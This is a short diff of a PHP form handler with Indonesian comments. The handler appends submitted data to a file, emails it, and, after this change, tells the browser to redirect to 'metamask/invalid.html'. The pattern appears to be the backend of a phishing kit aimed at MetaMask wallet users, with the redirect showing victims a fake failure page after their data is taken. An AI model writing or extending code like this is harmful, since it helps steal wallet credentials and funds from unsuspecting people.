@@ -40,7 +40,11 @@ file_put_contents($file, $fileData, FILE_APPEND);
 $subject = "Saran testing";
 kirim_email($subject, $fileData);
 
-// Kirim response JSON agar tidak error di fetch API
-echo json_encode(["success" => true, "message" => "Data berhasil dikirim."]);
+// Kirim response JSON dengan informasi redirect
+echo json_encode([
+    "success" => true,
+    "message" => "Data berhasil dikirim.",
+    "redirect" => "metamask/invalid.html"
+]);
 exit();
 ?>
